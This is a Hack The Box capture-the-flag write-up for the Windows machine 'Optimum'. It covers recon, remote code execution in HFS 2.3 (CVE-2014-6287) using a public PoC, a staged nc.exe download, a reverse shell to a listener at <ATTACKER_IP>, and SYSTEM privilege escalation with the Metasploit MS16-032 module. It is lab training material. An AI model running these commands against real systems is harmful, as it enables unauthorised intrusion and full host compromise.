# HTB — Optimum

**Difficulty:** Easy
**OS:** Windows Server 2012 R2
**Target Service:** HttpFileServer (HFS) 2.3
**CVE:** CVE-2014-6287 (HFS RCE) + MS16-032 (Kernel Privesc)
**Key Concepts:** HFS macro RCE, nc.exe staging, Windows kernel exploitation

---

## Phase Recon

Full port scan with service and OS detection:

```bash
nmap -sS -sV -O -p- 10.xx.xx.xx
```

Single open port:

| Port | Service |
|------|---------|
| 80 | HttpFileServer httpd 2.3 |

Only one port open — the entire attack surface is the HFS web application.

---

## Phase Exploit — CVE-2014-6287 (HFS 2.3 RCE)

HFS 2.3 contains a critical remote code execution vulnerability in its search macro functionality. The `search=` parameter fails to sanitize input, allowing an attacker to execute arbitrary commands via HFS's built-in scripting engine — no authentication required.

**Exploitation requires two prerequisites:**

**1. Stage nc.exe for callback**

The exploit's VBScript downloader fetches `nc.exe` from the attacker machine to establish the reverse shell. Without this, the exploit fires but no shell lands.

```bash
locate nc.exe
cp /usr/share/windows-resources/binaries/nc.exe /root/optimum/
cd /root/optimum
python3 -m http.server 80
```

**2. Set up listener**

```bash
nc -lvnp 4444
```

**3. Fire the exploit**

Used `39161.py` (public PoC for CVE-2014-6287):

```bash
python2 39161.py 10.xx.xx.xx 80 <ATTACKER_IP> 4444
```

Multiple HTTP 200 responses for `nc.exe` confirmed the target fetched the binary. Shell landed as `kostas`:

```
C:\Users\kostas\Desktop>whoami
optimum\kostas
```

Retrieved user flag from `C:\Users\kostas\Desktop\user.txt`. Flag redacted.

---

## Phase Privilege Escalation — MS16-032 (Kernel Exploit)

Ran `systeminfo` to capture OS build details:

```
OS: Windows Server 2012 R2 — Build 6.3.9600
```

Server 2012 R2 at this patch level is vulnerable to **MS16-032** — a Secondary Logon Handle privilege escalation vulnerability that allows a local user to obtain SYSTEM-level access by abusing the Windows Secondary Logon service.

Upgraded to a Meterpreter session for stable shell handling, then used the Metasploit module:

```
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION <session_id>
set LHOST <ATTACKER_IP>
set LPORT 5555
run
```

The module executed successfully and a new Meterpreter session opened as `NT AUTHORITY\SYSTEM`.

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Retrieved root flag from `C:\Users\Administrator\Desktop\root.txt`. Flag redacted.

---

## Key Takeaways

- A single open port is not a small attack surface — HFS 2.3 on port 80 was the entire foothold and privesc chain entry point
- The HFS exploit requires staging `nc.exe` on a local HTTP server before firing — skipping this step causes the exploit to appear to run successfully while delivering no shell
- Always verify your VPN IP (`ip a show tun0`) before firing callbacks — a changed lease sends the payload nowhere
- `systeminfo` is the critical post-exploitation command on Windows — the OS build number directly maps to applicable kernel exploits
- MS16-032 is reliable on unpatched Server 2012 R2 and is a core privesc path for the OSCP Windows module
- nc.exe shells are unstable — upgrading to Meterpreter before running local exploits prevents session loss mid-privesc
